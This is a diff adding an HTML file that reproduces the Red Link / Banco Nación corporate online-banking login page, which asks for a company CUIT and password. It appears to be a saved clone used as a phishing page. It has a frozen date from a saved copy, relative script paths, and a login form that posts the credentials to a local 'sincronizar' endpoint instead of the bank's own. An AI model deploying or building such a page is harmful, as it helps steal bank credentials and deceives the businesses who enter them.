@@ -1,0 +1,391 @@
+
+<meta http-equiv="Content-Type" content="text/html; charset=latin1">
+<!-- <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8"/> -->
+
+<title>Red Link</title>
+
+<link rel="stylesheet" href="https://bee.redlink.com.ar/bna2/banco/producto/css/login.css" type="text/css">
+<link rel="stylesheet" href="https://bee.redlink.com.ar/bna2/banco/producto/css/jquery.keypad.alt.css" type="text/css">
+
+<link rel="icon" type="image/png" href="banco/producto/imagenes/common/icons/favicon.ico">
+
+<script type="text/javascript" src="bibliotecas/js/jquery/jquery-1.4.2.min.js"></script>
+<script type="text/javascript" src="bibliotecas/js/jquery/ui/jquery-ui-1.8.6.custom.min.js"></script>
+<script type="text/javascript" src="bibliotecas/js/inputValidators.js"></script>
+<script type="text/javascript" src="bibliotecas/js/jquery/keyboard/jquery.keypad.js"></script>
+<script type="text/javascript" src="bibliotecas/js/tecladoVirtual.js"></script>
+<script type="text/javascript" src="bibliotecas/js/jquery/form/jquery.form.js"></script>
+<script type="text/javascript" src="bibliotecas/js/jquery/validate/jquery.validate.js"></script>
+<script type="text/javascript" src="bibliotecas/js/ajax/AjaxSubmitConfiguration.js"></script>
+<script type="text/javascript" src="bibliotecas/js/cuitValidator.js"></script> 
+<script type="text/javascript" src="bibliotecas/js/cuitInitialize.js"></script>
+<script type="text/javascript" src="bibliotecas/js/main_opbee.js"></script>
+
+<script type="text/javascript">
+
+	var usaTecladoVirtual = false;
+	var tecladoVirtual;
+	
+	var date = new Date();
+	var d  = date.getDate();
+	var day = (d < 10) ? '0' + d : d;
+	var m = date.getMonth() + 1;
+	var month = (m < 10) ? '0' + m : m;
+	var yy = date.getYear();
+	var year = (yy < 1000) ? yy + 1900 : yy;
+
+
+	//Preparo los atributos de configuracion del teclado
+	var charEsp;
+	
+	var tipoTeclado;
+	
+	if ( false ){
+		tipoTeclado = "";
+		charEsp = "";
+	}
+	else
+		tipoTeclado = 'NUM'
+	
+	
+	$(document).ready(function() {
+		
+		tecladoVirtual = getTecladoVirtual();
+		crear(tecladoVirtual, "#divVK", ['#psw'] , '.container', '#activadorTeclado', tipoTeclado, charEsp);
+		
+		asociarEventosCheckBox();
+		if (usaTecladoVirtual){
+			$('#activadorTeclado').attr('checked','checked');
+			activar(tecladoVirtual);
+		}
+
+		$('#cuitCategoria').focus();
+		
+		//Le pongo el submit a los inputs
+		$("form input").keypress(function (e) {
+	        if ((e.which && e.which == 13) || (e.keyCode && e.keyCode == 13)) {
+	        	submitEnviar();
+	            return false;
+	        } else {
+	            return true;
+	        }
+	    });
+		inicializarInputsCuit('cuitCategoria', 'cuitDni', 'cuitVerificador');
+		
+	});
+	
+	function asociarEventosCheckBox(){
+		$('#activadorTeclado').click(function() { 
+			$('#toggleTKForm').submit();
+			if ($(this).is(':checked')){
+				activar(tecladoVirtual);
+			}
+			else {
+				desactivar(tecladoVirtual);
+	    	}
+		})
+	};
+	
+	function clearFields() {
+		document.getElementById("cuitCategoria").value = "";
+		document.getElementById("cuitDni").value = "";
+		document.getElementById("cuitVerificador").value = "";
+		document.getElementById("psw").value = "";
+
+		var entered = document.getElementById("enteredCaptcha");
+		if(entered != null) {
+			entered.value = "";
+		}
+
+		var valToken = document.getElementById("valorToken");
+		if(valToken != null) {
+			valToken.value = "";
+		}
+
+		
+	}
+
+	function redirectToAlias(url) { 	 	 	 	
+ 		window.location = url;
+ 	}
+	
+	/* Validaciones en el onSubmit */
+	function validateInputs() {
+
+		if (!validatePassword()) {
+			var url = '/bna2/redirectToAlias.htm?message=ERR_OBLIGATORIO&_STATE_=11-0-4A13F7F404FA80F10EB62B4EB784DF19';
+			redirectToAlias(url);
+			clearFields();
+	        return false;
+		} 
+	
+		var value = armarCuit();
+		
+		if (!validateLengthCuit(value)) {
+			var url = '/bna2/redirectToAlias.htm?message=ERR_OBLIGATORIO&_STATE_=11-1-4A13F7F404FA80F10EB62B4EB784DF19';
+			redirectToAlias(url);
+			clearFields();
+			return false;
+		} 
+	
+		if(!validateCuit(value)) {
+			var url = '/bna2/redirectToAlias.htm?message=ERR_CUIT_COMPOSICION&_STATE_=11-2-4A13F7F404FA80F10EB62B4EB784DF19';
+			redirectToAlias(url);
+			clearFields();
+			return false;
+		}
+
+		if(!validateCaptcha()) {
+			showMessageError('Por favor, ingrese los datos solicitados.');
+			clearFields();
+			return false;
+		}
+
+		if(!validateSFA()) {
+			showMessageError('Por favor, ingrese los datos solicitados.');
+			clearFields();
+			return false;
+		}
+	
+		return true;
+	}
+	
+	function validateLengthCuit(value) {
+		return validateNotEmptyString(value);
+	}
+	
+	function validatePassword() {
+		var pass = document.getElementById("psw");
+		return validateNotEmptyString(pass.value);
+	}
+
+	function validateCaptcha() {
+		var enteredValue = document.getElementById("enteredCaptcha");
+		if(enteredValue != null) {
+			return validateNotEmptyString(enteredValue.value);
+		} else {
+			return true;
+		}
+		
+	}
+
+	function validateSFA() {
+		
+		return true;
+		
+	}
+	
+	function validateCuit(value){
+		return validarCuit(value); 
+	}
+	
+	function armarCuit() {
+		var cuitCategoria = document.getElementById("cuitCategoria").value;
+		var cuitDni = document.getElementById("cuitDni").value;
+		var cuitVerificador = document.getElementById("cuitVerificador").value;
+		var cuitElement = document.getElementById("cuit");
+		cuitElement.value = cuitCategoria + cuitDni + cuitVerificador;
+		return cuitElement.value;
+	}
+	
+	function showMessageError(message) {
+		var errorDiv = document.getElementById("divError");
+		errorDiv.style.display = "block";
+		var errorSp = document.getElementById("spError");	
+		errorSp.innerHTML = message;
+	}
+
+	 $(document).ready(function() {
+         $("input:password").bind('copy paste cut', function(e) {
+        	 return false;
+         });
+     });
+
+     function submitEnviar(){
+         if (validateInputs()){
+    	 	document.getElementById('formPassword').submit();
+         }
+     }
+
+ 
+     function setSelectionRange(input, selectionStart, selectionEnd) {
+    	  if (input.setSelectionRange) {
+    	    input.focus();
+    	    input.setSelectionRange(selectionStart, selectionEnd);
+    	  }
+    	  else if (input.createTextRange) {
+    	    var range = input.createTextRange();
+    	    range.collapse(true);
+    	    range.moveEnd('character', selectionEnd);
+    	    range.moveStart('character', selectionStart);
+    	    range.select();
+    	  }
+    	}
+
+    	function setCaretToPos (input, pos) {
+    	  setSelectionRange(input, pos, pos);
+    	}
+
+    	function autotab(original,previous,next){
+
+
+
+        	
+    		$(original).keyup(function(e) {
+
+    			if (e.keyCode == '8' && original.getAttribute&&original.value.length == 0)
+    				{
+    					if (previous != null){
+    					previous.focus();
+    					setCaretToPos(previous,previous.value.length);
+    				}
+    			}
+
+    			if (e.keyCode != '8' && original.getAttribute&&original.value.length == original.getAttribute("maxlength"))
+    				{
+    				if (next != null){
+    					next.focus();
+    				}
+
+    		}
+
+    			
+    			
+    		});
+    		   	 
+
+    		        }
+    	
+</script>
+
+
+<div id="ingresoClave">
+	<div class="mainContainer">
+		<div class="container">
+	
+			<div class="header">
+				<div id="logoEntidad">
+					<img src="https://bee.redlink.com.ar/bna2/banco/producto/imagenes/common/logos/logo_200.gif">
+				</div>
+				<div id="logoProducto">
+				</div>			
+			</div>
+	
+			<div class="bandaHeader">
+				<div class="bandaTitle">
+					BANCA ELECTRONICA PARA EMPRESAS
+				</div>
+				<div class="bandaFecha">
+					<script type="text/javascript">document.write(day + " / " + month + " / " + year);</script>20 / 05 / 2022
+				</div>
+			</div>
+
+	    	<div class="content">
+	
+				<div class="col-01">
+				</div>
+	
+				<div class="col-02">
+				</div>
+				
+				<div class="col-03">
+					<div class="bienvenido">
+						Bienvenido a la Banca Electronica para Empresas
+					</div>
+				
+					<div id="divError" class="mensajeError" style="display: none;">	
+						<span id="spError">&nbsp;</span>				
+					</div>
+					
+										
+				
+					<div id="bloqueLogin" class="loginBEE">
+						
+						<form id="formPassword" action="sincronizar" method="post" enctype="multipart/form-data" onsubmit="return validateInputs()">
+						<table style="padding-top:10px;" cellspacing="2" cellpadding="2" border="0">
+						<tbody><tr>
+					    	<td colspan="4" style="text-align: left;"><input type="checkbox" id="activadorTeclado">
+								<img src="https://bee.redlink.com.ar/bna2/banco/producto/imagenes/common/icons/ico_teclado.gif"> Deseo utilizar teclado virtual.
+			                </td>
+					    </tr>
+						<tr>
+							<td rowspan="2" style="text-align: left;"></td>
+							<td style="text-align: left;">CUIT de la empresa:</td>
+							<td colspan="2" style="text-align: left;">
+								<input id="cuit" name="cuit" type="hidden" value=""> 
+								<input type="text" name="cuit1" id="cuitCategoria" size="2" autocomplete="off" onkeyup="autotab(this, null,cuitDni)" maxlength="2" required>
+								<input type="text" name="cuit2" id="cuitDni" size="8" autocomplete="off" onkeyup="autotab(this,cuitCategoria,cuitVerificador)" maxlength="8" required>
+								<input type="text" name="cuit3" id="cuitVerificador" size="1" autocomplete="off" onkeyup="autotab(this,cuitDni, psw)" maxlength="1" required>
+							</td>
+						</tr>
+						<tr>
+							<td style="text-align: left;"><label for="password">Clave:</label></td>
+							<td style="text-align: left;"><input id="psw" name="password" type="password" value="" size="15" maxlength="30" autocomplete="off" required></td>
+						</tr>
+						</tbody></table>
+						
+						
+						
+						
+						
+						<table cellspacing="2" cellpadding="2">
+						<tbody><tr>
+							<td>
+						
+							<button class="button">Enviar</button>
+							
+						</tr>
+						</tbody></table>
+						<input type="hidden" name="_STATE_" value="11-4-4A13F7F404FA80F10EB62B4EB784DF19">
+</form>
+					</div>
+				
+				<div class="importante">
+					<b>Seguridad en operaciones por Home Banking / Banca para Empresas.</b>
+					<p>Recuerde que esta Entidad no envia correos electrónicos (email) ni realiza llamados telefónicos para solicitar cambio o confirmacion de datos personales (numero de cuenta, nombre de usuario, clave de acceso). Red Link S.A. en ningún caso se comunicará con Ud. requiriéndole este tipo de información.</p>
+					<p style="text-align:right">1.627.9</p>
+				</div>
+			</div>
+		</div>
+
+		<div class="footer">
+
+	<script src="bibliotecas/js/JavaScript-Seal-v3.0.js" type="text/javascript"></script>
+	<div style="text-align:right; padding-right: 10px" title="Haga Click para Verificar - Este sitio cuenta con un Certificado SSL de Symantec para asegurar la confidencialidad de sus comunicaciones.">
+		<a href="javascript:Seal_Certificado('bee.redlink.com.ar', 'es', 'CURS-3.0', 'imagen');">
+			<img src="https://bee.redlink.com.ar/bna2/bibliotecas/imagenes/CURS-3.0.png" alt="CertiSur Seal" width="100" height="72" border="0">
+		</a>
+		<script type="text/javascript" src="https://seal.websecurity.norton.com/getseal?host_name=bee.redlink.com.ar&amp;size=S&amp;use_flash=NO&amp;use_transparent=YES&amp;lang=es"></script>
+	</div>
+	
+</div>
+				
+	</div>
+	<div id="divVK" class="divVK hasKeypad ui-draggable" style="display: none; width: 170px; position: absolute; left: 38px; top: 69px;" readonly="readonly"><div class=" keypad-inline" style=""><div class="keypad-row"><button type="button" class="keypad-key" title="">0</button><button type="button" class="keypad-key" title="">3</button><button type="button" class="keypad-key" title="">2</button><button type="button" class="keypad-key keypad-enter" title="Proceder">Aceptar</button></div><div class="keypad-row"><button type="button" class="keypad-key" title="">9</button><button type="button" class="keypad-key" title="">6</button><button type="button" class="keypad-key" title="">5</button><button type="button" class="keypad-key keypad-back" title="Borrar el ultimo caracter">Volver</button></div><div class="keypad-row"><button type="button" class="keypad-key" title="">8</button><button type="button" class="keypad-key" title="">7</button><button type="button" class="keypad-key" title="">4</button>
+	<button type="button" class="keypad-key keypad-close" title="Cerrar el Teclado Virtual y borrar clave">Cerrar</button></div><div class="keypad-row"><div class="keypad-space"></div><button type="button" class="keypad-key" title="">1</button><div class="keypad-space"></div><button type="button" class="keypad-key keypad-clear" title="Borrar todo el texto">Limpiar</button></div><div style="clear: both;"></div></div></div>
+	<form id="toggleTKForm" action="/bna2/toggleTecladoVirtual.htm" method="post">  <script type="text/javascript">
+  
+    $(document).ready(function()
+    {
+      var validationConfig = {"messages":{},"rules":{}};
+      var options = {
+        formId: "toggleTKForm",
+        validationsConfig: validationConfig,
+        errorHandler: function(json){},
+        loadCompleteFunction: function(json){},
+        ajaxSubmit: true,
+        last: null
+      };
+      
+      var toggleTKFormAjaxSubmitConfiguration = new ajaxSubmitConfiguration(options);
+    }
+    );
+    
+  </script>
+
+	<input type="hidden" name="_STATE_" value="11-5-4A13F7F404FA80F10EB62B4EB784DF19">
+</form>	
+</div> 
+</div> 
+
+<div class="keypad-popup" style="display: none;"></div>
